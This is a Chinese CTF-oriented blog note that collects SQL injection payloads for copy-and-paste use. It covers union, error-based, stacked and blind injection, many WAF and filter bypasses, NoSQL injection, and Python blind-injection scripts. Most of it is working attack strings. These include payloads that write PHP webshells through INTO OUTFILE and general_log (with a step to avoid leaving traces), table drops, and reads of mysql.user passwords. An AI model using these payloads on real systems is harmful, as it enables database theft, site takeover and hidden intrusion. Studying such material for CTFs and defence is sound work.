---
title: SQL注入
author: Creexile
date: 2024-04-24 22:16:11
lastMod: 2025-12-30
summary: '用来直接复制粘贴的笔记'
cover: ''
category: 'CTF'
draft: false
comments: false
sticky: 0
tags: [SQL注入]
---

# SQL注入介绍

---

本质为因为网站对用户输入没有进行充分过滤(过于信任), 导致的sql语句拼接并查询数据库得到了敏感信息

建议学一些数据库语句, 浅尝即止, 能看得懂下面的语句就可以了

# 注入方式

## union 联合注入

形似`select (select ... where ...),2,3`

```
# 判断列数
-1' order by 4 --

# 判断显示位
-1' union select 1,2,3 --
// 假如未出现 123 尝试查看下一行
-1' union select 1,2,3 limit 1,1 --

# 查询数据库名
-1' union select 1,database(),3 --
# 查询所有数据库名
-1' union select 1,(select group_concat(schema_name) from information_schema.schemata), 3 --

# 查询数据库内表名
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database(),3 --
# 或
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='database_name',3 --

# 查询此表内字段名
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='table_name',3 --

# 查询字段内容
-1' union select 1,group_concat(id,flag) from table_name,3 --
```

有些时候你会发现上面的语句报错, 你可以尝试下面这种

形似`select 1,2,3 where ...`

```
# 查询数据库内表名
-1' union select group_concat(table_name),2,3 from information_schema.tables where table_schema='nexadata'#
```

## 报错注入

什么时候使用报错注入：

查询无回显位, 或者源代码中有输出错误的代码的时候, 使用报错注入

```
# 检查是否有正常回显, 漏洞验证
1' and updatexml(1,'~',3) --

# 获取所有数据库
-1' and updatexml(1,concat('~',substr((select group_concat(schema_name)from information_schema.schemata), 1 , 31)),3) --

# 获取当前数据库名
-1' and updatexml(1,concat('~',database()),3) --

# 获取数据库内表
-1' and updatexml(1,concat('~',substr((select group_concat(table_name)from information_schema.tables where table_schema = 'database_name'), 1 , 31)),3) --

# 获取表内字段
1' and updatexml(1,concat('~',substr((select group_concat(column_name)from information_schema.columns where table_schema = 'database_name' and table_name = 'table_name'), 1 , 31)),3) --

# 获取表内信息
-1'and updatexml(1,concat('~',substr((select column_name from table_name), 1 , 31)),3)--
# 或
-1' and updatexml(1,concat('~',substr((select password from mysql.user where user='mituan') , 1 , 31)),3) --
```

| 名称                        | 描述                                                                           |
| --------------------------- | ------------------------------------------------------------------------------ |
| floor(X)                    | 返回值不大于整数X                                                              |
| extractvalue)               | 从XML字符串中提取XPath符号                                                     |
| updatexmlo                  | 返回替换的XML片段                                                              |
| NAME_CONST （适用于低版本） | 返回给定的值。当其用于产生一个结果集时，将导致列有给定的名称。该参数应该是常数 |

## 无列注入

通过 join 建立两个表之间的内连接, 也就是说跟给列赋别名有点相似，就是在取别名的同时查询数据
进行查询时语句的字段数必须和指定表中的字段数一样，不能多也不能少，不然就会报错

## 堆叠注入

利用分号使得原语句和构造的语句都执行一次, union联合查询是两个查询一起执行, 所以才需要类似-1这种让前面的查询无回显

堆叠注入最大的特点就是可直接执行命令, 所以可以更改判断条件的变量使得我们绕过这个判断;

此处利用的就是update更新数据库:

```
POST:
username=0;update user set pass=1&password=1
```

## 盲注

### 布尔盲注

- 存在回显1, 不存在回显0
- 输入不存在的用户名会输出用户不存在, 否则输出密码错误

测试用语句:

```mysql
if(condition, value_if_true, value_if_false)
if(2>1,1,0)
# 直接判断是否存在盲注, 或者结合load_file()对文件内容内容进行判断, 即当存在时返回0, 不存在时返回1
```

### 时间盲注

测试用语句:

```mysql
ip=if(2>1,sleep(5),1)&debug=1
# 可以感觉到差不多延时5s, 就证明存在盲注
```

构造payload用的函数:

> 有时候结合handler进行注入

# sqlmap

这个见[[sqlmap]]笔记, 里面有更详细的使用方法

# 绕过

当 database 被过滤, 可以访问一个不存在的数据库来返回数据库名

当column被过滤, 用 join 无列注入

假如 updatexml 被过滤, 可以替换为 extractvalue, extractvalue 函数只能显示返回的32个字符串,结合 substr 等使用

```
# 查询数据库
1' and (extractvalue(1,concat('~'(select database()))));
1' and (extractvalue('anything',concat('/',(select database()))));
1' and (extractvalue('anything',concat('~',substring((select database()),1,5))));
1' and extractvalue(1,concat(0x7e,(select database()),0x7e))#
# 访问不存在的数据库来返回数据库, 或者将||换成or,爆库。
1'||(select * from aa)#

# 获取数据库内表
-1' || extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like 'sqlsql')))#

```

## 过滤or and xor

| 原字符串 | 替换字符串 |
| -------- | ---------- |
| and      | \&\&       |
| or       | \|\|       |
| not      | !          |
| xor      | \|         |

还可以结合其他逻辑或者比较操作符

```sql
if not (a=1) then
等价于
if a<>1 then

id=1 and 1=2 
可以被改写为 
id=1 or not 1=1
```

还可以利用`union select`的报错进行盲注, 通过注入一个不存在的列触发报错, 通过报错信息判断

下面这个例子如果回显正常则说明以root开头, 利用脚本逐字猜解数据

```sql
-- 利用union探测列数
union select 1,2,3
-- 利用列数盲注
union select 1,2,user() like 'root%'
```

还可以利用`if`函数的替代品

`case when ... then ... end`功能完全一样且一般不会被过滤

```sql
or (case when (database() like 'd%') then sleep(5) else 0 end)
```

`greatest()` 和 `least()` 这两个函数返回一组值中的最大值和最小值。我们可以利用它们来构造条件判断

```sql
or greatest(ascii(substr(database(),1,1)), 100)>100
```

还可以利用其他查询, 比如`having`字句和`limit offset`

- `having` 用于对 `group by` 的结果进行过滤。在一些情况下，`having` 后面可以接子查询，可以利用这一点进行注入
- 我们可以通过 `limit` 和 `offset` 来逐行读取数据，再结合其他技术进行判断

## 过滤in和not in

假如一个表有三行, 不能查看1只能查看2,3就用not in, 只会显示1的内容

```sql
select * from users where id in (2,3);
select * from users where id not in (2,3);
```

## 过滤空格

在select语句外

```
双空格
/**/
括号绕过
回车代替(//ascii码为chr(13)&chr(10)，url编码为%0d%0a)
%09
%20
%0A
%0C
%0D
%0B
%A0
$IFS
${IFS}
$IFS$9
<>
<
\x20
```

在select语句内

```
# 反引号
-1'/**/union/**/select/**/1,(select`password`from`user`where`username`='flag'),3%23
# 单引号
-1'/**/union/**/select'1',(select`password`from`user`where`username`='flag'),3%23
# 括号
username=-1',(select(group_concat(flag))from(flagb)))%23
select(*)from(admin)where(uname)= ("admin")
```

## 过滤select

基本就是过滤了联合注入, 但是可以用or

```
-1' or username='flag
```

## 过滤-

## 过滤union

一般会选择换个方向, 比如盲注

## 返回值过滤

规定返回的值不能有特定内容

- 过滤字符串

过滤字符串这种就加一层编码就行, 比如md5, sha, hax等等

```sql
select id,hex(username),password from user where username='admin'
```

- 过滤数字

过滤所有数字的就需要加点东西了, 可以用replace嵌套去替代数字

```python
i = 0
s = f"replace(password,{i},'{chr(ord(str(i)) + 55)}')"
for i in range(1,10):
    s = f"replace({s},{i},'{chr(ord(str(i)) + 55)}')"
print(s)
```

还原脚本

```python
flag = 'ctfshow{fgggaeje-lljd-kkjd-ojoo-akhdefbmdlbb}'

for i in range(10):
    flag = flag.replace(chr(ord(str(i)) + 55), str(i))
print(flag)
```

- 过滤所有字符`\x00-\x7f`

这种时候考虑外带, 写在文件中, 给网站写个马

```
-1'union select username,password from user into outfile '/var/www/html/flag.txt'%23

-1'union select 1,"<?php @eval($_POST['cmd']); ?>" into outfile '/var/www/html/1.php'%23
```

## substr函数

- mid 函数绕过, 但是注意 mid 多数时候只在 MySQL 中使用

`MID( column_name , start , length)`, substr同下

| 参数        | 描述                                     |
| ----------- | ---------------------------------------- |
| column_name | 要提取字符的字段                         |
| start       | 规定开始位置                             |
| length      | 可选,要返回的字符数,不填则返回剩余字符串 |

```sql
MID(DATABASE(),1,1)>'a'		# 查看数据库名第一位
MID(DATABASE(),2,1)			# 查看数据库名第二位, 依次查看各位字符
```

- left 函数绕过

  Left ( string, n ) string为要截取的字符串, n为长度

```sql
left(database(),1)>'a'		# 查看数据库名第一位
left(database(),2)>'ab'		# 查看数据库名前二位
```

## 关键词替换为空

部分过滤是select等关键词, 关键词短语替换为空,可以用双写绕过
union -> uniunionon

## 过滤等号

使用 like, rlike, regexp, < , >替代

```sql
select ascii(substring(user(),1,1))<115;
select ascii(substring(user(),1,1))>114;

select substring(user(),1,1) like 'r%';
select substring(user(),1,1) rlike 'r';

select user() regexp '^ro';
```

## 过滤逗号

盲注获取数据库名(时间盲注)

```
1' or case when (substr((select database()) from 1 for 1)='c') then sleep(5) else 0 end--
```

联合查询

```
' union select * from ((select 1)a join (select @@version)b join(select 3)c)--
```

绕过LIMIT限制

```
' order by 1 limit 1 offset 0--
```

针对mysql

```
select mid(database() from 1 for 1)
```

## 过滤注释符

利用闭合的方式查询, 主要还是靠查询语句

```
-1'union%0cselect'1',2,'3

-1'%0cor%0cusername='flag

-1'union%0cselect'1',(select`password`from`ctfshow_user`where`username`='flag'),'3
```

## 过滤sleep

1. `benchmark()`

   `benchmark()`是Mysql的一个内置函数,其作用是来测试一些函数的执行速度

   ```mysql
   benchmark(执行的次数, 要执行的函数或者是表达式)
   benchmark(1500000,md5(1))
   ```

   执行不同的次数那么执行的时间也就不一样, 通过这个函数我们可以达到与`sleep()`同样的延时目的

2. 笛卡尔积

   通过做大量的查询导致查询时间较长来达到延时的目的。通常选择一些比较大的表做笛卡尔积运算

   > 没有使用任何连接条件的两个表, 数据库会执行笛卡尔积操作

   所以可以用下面这个替代sleep:

   ```mysql
   (select count(*) from ((information_schema.columns)A, (information_schema.columns)B, (information_schema.columns limit 1,7)c) limit 1)
   ```

3. get_lock 加锁

4. 超长字符串连接

## 过滤数字

可以用str构造数字和字母

[String Functions and Operators](https://dev.mysql.com/doc/refman/8.4/en/string-functions.html)

```mysql
select true+true;		# 返回2
select concat((true+true),(true+true));		# 返回22
select concat((true+true),(true+true),'f');		# 返回22f
select false;		# 返回0
select concat(false);		# 返回0
```

可用脚本可以看 ctfshow web185

## 过滤information_schema

参考文章

- [概述MySQL统计信息](https://www.jb51.net/article/134678.htm)

那些拼接就不管了, 主要是替代品

> mysql默认存储引擎innoDB携带的表:

利用`innodb_table_stats`代替`information_schema`, `mysql.innodb_table_stats`和`mysql.innodb_index_stats`, 两表均有`database_name`和`table_name`字段

```
# 查表 banlist,user,flag
password=1\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#
```

## 传入变量后解码

可以整个payload编码一次, 或者直接闭合整个语句后拼接

```php
# 部分查询语句
where ip = from_base64($id);
# 传入的参数
?id='1') or if(2>1,sleep(5),1)#
```

## 限制传入参数长度

利用泄露的账号密码可以登陆, 如果没有, 就只能靠其他方面的弱点了

比如说没有单引号包裹啊, 或者存在下面这种:

```php
if($row[0]==$password){
    $ret['msg']="登陆成功 flag is $flag";
}
```

可以利用select 来设置`$row[0]`的值, 从而绕过判断

## 通配符绕过

sql的通配符是`%`

```
-1' or username like'%fla%
```

## 溢出绕过

```sql
id=1 and (select 1)=(Select 0xAAAAAAAA... (1000个A)) +
union select 1,2,version(),4,5,database(),user(),8,9,10,...,36--+
```

## ascii 字符对比绕过

如果对 union select 进行拦截 而且似乎怎么都绕不过去, 那么可以不使用联合查询注入, 可以使用字符截取对比法

感觉就是盲注

```sql
select substring(user(),1,1);
select * from users where id=1 and substring(user(),1,1)='r';
# 最好把'r'换成成 ascii 码
select * from users where id=1 and ascii(substring(user(),1,1))=114;
```

## 二次编码绕过

有些程序会解析二次编码,大部分情况下, 绕过 gpc 字符转义 和 waf 的拦截

## 拼接绕过

简单拆一下

```
-1' union select 1,('selec','t * from flag'), 3%23
```

还有这种拼接

```
admin
CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)
SELECT(0x3C613E61646D696E3C2F613E,0x2f61))
```

## 多函数拆分绕过

多余多个参数拼接到同一条 SQL 语句中, 可以将注入语句分割插入。

例如请求 get 参数:
a=\[input1\]&b=\[input2\] 可以将参数 a 和 b 拼接在 SQL 语句中。
条件:
在程序代码中看到两个可控的参数, 但是使用 union select 会被 waf 拦截。

```php
$id = isset($_GET['id'])?$_GET['id']:1;
$username = isset($_GET['uername'])?$_GET['username']:'admin';
$sql = "select * from users where id = '$id' and username = '$username'";

//传入 -1' union/*&username=*/select 1,user(),3,4--+
//查询语句会变为 select *from users where id='-1' union/*' and username='*/select 1,user(),3,4--'
```

## select语句变形

查阅mysql官网[SELECT Statement](https://dev.mysql.com/doc/refman/8.4/en/select.html)查看有什么可以替换的

```sql
select count(*) from user group by username having username='flag'
select count(*) from user group by username having username regexp(0x666c6167)
# flag的十六进制
```

## 大小写绕过

这都什么时候的技术了

```
SeleCT、uNioN、And、Or
```

## 特殊字符串

详情见ctfshow web187

```php
$password = md5($_POST['password'],true);

$sql = "select count(*) from ctfshow_user where username = '$username' and password= '$password'";
```

这个时候`ffifdyop`就会派上用场

在经过md5假面之后该字符串会变成`'or'6`加上不可见字符, 这样就构建了一个永真的判断

而在查询语句中, 只要字符串头出现数字就可以构造永真判断:

```sql
# 不可行
select count(*) from user where username =''or'aaaa';
# 可行
select count(*) from user where username =''or'6aaaa';
```

## 关键词添加无效字符

`SE%00LECT`、`Sel%0bECT`、`%00-%0b`及其他空字符

## 变量未包裹

在查询变量没有单引号包裹的时候, 会自动进行字符类型转换; 首字符是字母转换过来就是0, 首字符是数字就会匹配输入的数字

```php
$sql = "select pass from ctfshow_user where username = {$username}";
```

![image-20240810205728809](https://raw.githubusercontent.com/4reexile/Misc_/refs/heads/main/images/md/image-20240810205728809.png)

所以提交`username=0`, 就可以通过一些判断

## 删除/更新表

可以很长, 又不能联合注入, 而且没有通过单引号包含传入的参数, 尝试执行相关命令: 更新表或者删除后新建一个一样的表

```mysql
# 删除ctfshow_user表
drop table users;
# 创建一个新的表user
create table users(`username` varchar(100),`pass` varchar(100));
# 用于向user表插入一条数据
insert users(`username`,`pass`) value(1,2);
```

## handler语句

参考文章:

- [MySQL 之 handler 的详细使用及说明](https://blog.csdn.net/qq_43427482/article/details/109898934)
- [HANA mysql使用场景 mysql handler的作用](https://blog.51cto.com/u_16099241/10499216)

`handler语句`让我们能够一行一行的浏览一个表中的数据, 但是它仅在`mysql`存在且不包含`select`函数的完整功能;

最堆叠注入中, 基本上结合我们的show就可以绕过大部分过滤

```
# 查表
1';show tables;%23
# 查内容
1';handler `ctfshow_flagasa` open;handler `ctfshow_flagasa` read first;%23
```

## 预处理

预处理就是定义一串sql查询语句为一个名字, 然后直接通过这个名字来运行该查询语句

标准格式如下, 有时候需要去掉那个"删除预定义语句"

```mysql
PREPARE name from '[my sql sequece]';
# 预定义SQL语句
EXECUTE name;
# 执行预定义SQL语句
(DEALLOCATE || DROP) PREPARE name;
#删除预定义SQL语句
```

可以用十六进制替代部分参数, 比如

```mysql
prepare h from 0x73686f77207461626c6573;execute h;
```

> 例题可以看ctfshow web225

## 转译符号

利用转译符号去掉特定的单引号

```mysql
update ctfshow_user set pass = '\' where username = ',username=database()#'
# 等价于
update ctfshow_user set pass = 'x',username=database()#'
```

## 存储过程和函数

参考文章:

- [mysql之存储过程和存储函数](https://zhuanlan.zhihu.com/p/649802945)
- [mysql存储过程和函数总结](https://blog.csdn.net/uftjtt/article/details/80435520)
- [MySQL 进阶之存储过程/存储函数/触发器](https://cloud.tencent.com/developer/article/2153139)

这个似乎也归类在堆叠注入

## 安全狗绕过

- [[../../渗透/渗透知识/安全狗绕过]]

## outfile()被过滤

1. 利用`dumpfile()`函数, 这是一个直接的替代方案

但是`outfile()`可以将查询结果输出到文件中(支持多行), 而`dumpfile()`只能输出单行数据

使用方式

```sql
select '<?php system($_GET[cmd]);?>' into dumpfile '/var/www/html/shell.php'
```

2. 利用日志文件

数据库开启了通用查询日志(general_log)或者慢查询日志(slow_query_log)并且可以修改日志路径, 那么可以利用这一点写webshell

```sql
# 修改日志路径
SET GLOBAL general_log_file = '/var/www/html/shell.php';

# 开启日志
SET GLOBAL general_log = ON;

# 写入 Webshell
SELECT '<?php system($_GET["cmd"]); ?>';

# 写入完成后，关闭日志并重置路径，避免留下痕迹
SET GLOBAL general_log = OFF;
SET GLOBAL general_log_file = '/path/to/original/log';
```

## 盲注过滤if()

1. case when
2. union + 错误信息
3. 位运算和 like 语句
4. benchmark()
5. get_lock()
6. elt()

## 奇妙的绕过

`username=0;show tables&password=user`, 这个可以绕过下面这个

```php
//拼接sql语句查找指定ID用户
$sql = "select pass from ctfshow_user where username = {$username};";

if($row[0]==$password){
    $ret['msg']="登陆成功 flag is $flag";
}
```

使用一些数学运算函数（例如“exp(x):”，取常数e的x次方，e是自然对数的底）构造报错语句

将\n\r\t这样的字符添加在关键字中，程序在处理换行时自动把 下一行接到上一行从而构成语句

# 其他注入

## Limit注入

可参考的文献:

- [P神转载-Mysql下Limit注入方法](https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html)
- [mysql注入之limit注入](https://www.jianshu.com/p/6c1420a7a7d9)

> 此方法适用于MySQL 5.x中，在limit语句后面的注入

在官方的select语句解释中, `limit`后可以跟`procedure`和`into`, 可以利用`procedure`进行注入, 通常结合报错注入

```mysql
SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
```

## Group by注入

可参考的文章:

- [CTF-sql-mysql group by报错注入](https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html)

似乎有报错注入和盲注两种方法

## Floor()报错注入

一般用在同时过滤`updatexml`和`extractvalue`的情况下

参考文章:

- [floor报错注入](https://blog.csdn.net/qq_63844103/article/details/128569910)
- [关于floor()报错, 你真的懂了吗](https://www.freebuf.com/articles/web/257881.html)

如果上面三个全部都过滤了, 换一下函数就可以了:

```
floor()	向下取整
ceil()	向上取整
round()	四舍五入
```

## Update注入

利用子查询将结果更新到可见表中, 也是一种拼接

```php
$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
```

```
# 查库 web
password=1',username=database()#&username=1
# 查表 banlist,user,flag
password=1',username=(select group_concat(table_name) from information_schema.tables where table_schema=database())#&username=1
# 查列 id,flag,info
password=1',username=(select group_concat(column_name) from information_schema.columns where table_name='flag')#&username=1
# 查字段
password=1',username=(select flag from web.flag) where 1=1#&username=1
```

## Insert注入

和Update注入大差不差, 只不过这次是插入数据

```php
$sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";
```

```
# 查表：
username=123',(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&password=123
# 查列：
username=123',(select group_concat(column_name) from information_schema.columns where table_name='flag'))#&password=123
# 查数据：
username=123',(select group_concat(flag) from flag))#&password=123
```

## 无列名注入

又名无列注入, 其实就是柱子替代列名

参考文章:

- [CTF|mysql之无列名注入](https://zhuanlan.zhihu.com/p/98206699)
- [Bypass information_schema与无列名注入](https://blog.csdn.net/qq_45521281/article/details/106647880)

## Delete注入

delete不能用union和select, 可以用报错注入或者是盲注

如果回显没有被覆盖, 那就用报错注入

## into outfile

这个真没名字吧

参考文章:

- [SELECT ... INTO Statement](https://dev.mysql.com/doc/refman/8.4/en/select-into.html)
- [数据备份(导出数据 / 导入数据)](https://blog.csdn.net/weixin_50002038/article/details/131349038)
- [sql注入之文件写入into outfile](https://www.cnblogs.com/zjhzjhhh/p/14129167.html '发布于 2020-12-13 17:06')

## UDF注入

参考文章:

- [UDF提权命令执行](https://www.freebuf.com/articles/web/283566.html)
- [sqlmap udf文件的16进制](https://www.sqlsec.com/tools/udf.html)

这个也用于渗透中的提权操作

## HTTP请求头注入

- User-Agent： 很多网站会记录访问者的 User-Agent 信息。如果后台程序直接将 User-Agent 拼接到 SQL 查询中，就可能存在注入
- X-Forwarded-For： 这个头通常用于获取用户的真实 IP 地址。当网站部署了负载均衡或 CDN 时，它会记录用户的原始 IP。同样，如果处理不当，也可能成为注入点
- Cookie： 网站通常会使用 Cookie 来存储会话信息或其他用户数据。如果 Cookie 中的某个值直接参与了 SQL 查询，就可能被利用
- Referer： 网站会记录用户是从哪个页面跳转过来的。如果这个信息直接被用于查询，同样存在风险

一般直接模糊

## 内联注释

简单例子

```sql
/*! uNION */, /*! SelECt */
```

内联注释符是一种基于注块注释衍生出来的注释风格, 它可以用于整个SQL语句中, 用来执行SQL语句; 内联注释有个特殊点, 当内联注释中出现小于或等于当前版本号得时候, 内联注释符里得子句会被执行, 大于时则不会被执行

版本写法, 如：5.5.34, 在注释中写成为50534, 版本号第二位加0, 所以有这种必定执行的写法

```sql
/*!10000uNION */, /*!10000SelECt */
```

> 总不可能小于1.0.00吧

## Quine注入

### 原理

Quine指的是自产生程序, 简单的说, 就是输入的sql语句与要输出的一致

```php
// 特征:
 if ($row['passwd'] === $password) {
     die($FLAG);
 }
```

但是一般出现这种代码, 表都是空的, 可能会有后台phpmyadmin弱密码登录, 登录后通常会发现是空的

只有构造输入输出完全一致的语句, 才能绕过限制得到FLAG, 主要利用replace(str,old_string,new_string)进行构造, 构造思路如下:

```sql
select replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")');
```

输入和输出的结果为下 :

```sql
replace('replace(".",char(46),".")',char(46),'replace(".",char(46),".")');
replace("replace(".",char(46),".")",char(46),"replace(".",char(46),".")") ;
```

但是依然还有单引号和双引号不一致, 再套一层, 最后结果如下, 实现了输入输出一致

```sql
replace(replace('replace(replace(".",char(34),char(39)),char(46),".")',char(34),char(39)),char(46),'replace(replace(".",char(34),char(39)),char(46),".")');
```

### 附加条件处理

- 过滤了char, 用chr或者直接0x代替即可
- 函数使用限制, 用大小写绕过

## nosql

就是其他数据库的注入/查询方法

1. MongoDB重言式

在mongodb中，要求的查询语句是json格式，如`{"username": "admin", "password": "admin"}`

而在php中，json就是数组，也就是`Array('username'=> 'admin', 'password'=> 'admin')`，

同时MongoDB要求的json格式中，是可以进行条件查询的，如这样的json: `{"username": "admin", "password": {"$regex": '^abc$'}}`，会匹配密码abc

也就是说，如果键对应的值是一个字符串，那么就相当于条件等于，只不过省去了json，如果键对应的值是json对象，就代表是条件查询

```
username[$ne]=1&password[$ne]=1
```

> `$ne`是不相等的意思, `$regex`则是正则匹配

也可以利用盲注, 只是payload构造不同罢了

# 脚本编写

利用`regexp()`函数:

```
# 假设 user 表有以下记录：
| id | pass     |
|  1 | password |
|  2 | ctf123   |
|  3 | secret   |
|  4 | ctf_flag |

# 执行查询 select * from user where pass regexp("ctf") 将返回：
| id | pass   |
|  2 | ctf123 |
|  4 | ctf_flag |
```

示例代码:

```python
from requests import post
from string import digits, ascii_lowercase

url = ''
payload = 'admin\' and (select database()) regexp \'{}\' #'

for c in '-}_' + digits + ascii_lowercase:
    resp = post(url, {'username': payload.format(flag + c)})
```

或者是直接遍历字符, 用函数给他编个码, 示例代码如下

```python
import requests
url = ""
payload = "admin'and (ord(substr((select f1ag from ctfshow_fl0g),{},1))<{})#".format(i, mid)

data = {
    "username": payload,
    "password": 0
        }
res = requests.post(url=url, data=data)
```

# 附录

这是一个能应对大多数题目的盲注脚本, 有时候不好用

```python
import requests
import time


def res_judge(url, payload):
    # 发送请求并判断响应时间是否足够长, 以确认匹配

    data = {
        "ip": payload,
        "debug": 1
    }

    try:
        res = requests.post(url=url, data=data, timeout=0.7)
    except requests.exceptions.Timeout:
        time.sleep(0.1)
        print(f"[+] Payload: {payload}")
        return 1
    except requests.exceptions.RequestException as e:
        print(f"[!] Error occurred: {e}")
        return -1


def the_length(url, query):
    # 确定查询结果的长度
    for i in range(1, 80):

        payload = f"\'or if((length(({query})))={i},sleep(2),1)#"
        # if((length(({query})))={length},sleep(2),1)&debug=1
        if res_judge(url, payload):
            print(f"[+] Found the length: {i}")
            return i


# 初始化
url = "http://a24c3f93-a30a-47eb-abb2-6a4983c4468b.challenge.ctf.show/api/"
flagstr = ",_{}-abcdefghijklmnopqrstuvwxyz0123456789"
flag = ""

# query = "select database()"
# query = "select group_concat(table_name) from information_schema.tables where table_schema = database()"
# query = "select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagxc'"
query = "select flagaa from ctfshow_flagxc"

length = the_length(url, query)
if length:
    for i in range(1, length + 1):
        for mid in flagstr:

            payload = f"\'or if((substr(({query}),{i},1)='{mid}'),sleep(2),1)#"
            if res_judge(url, payload):
                flag += mid
                print(f"[+] Found {i}th character: {mid}")
                print(f"[-] The String: {flag}")
else:
    print(f"[!] Error occurred: length return none")
    exit()
```
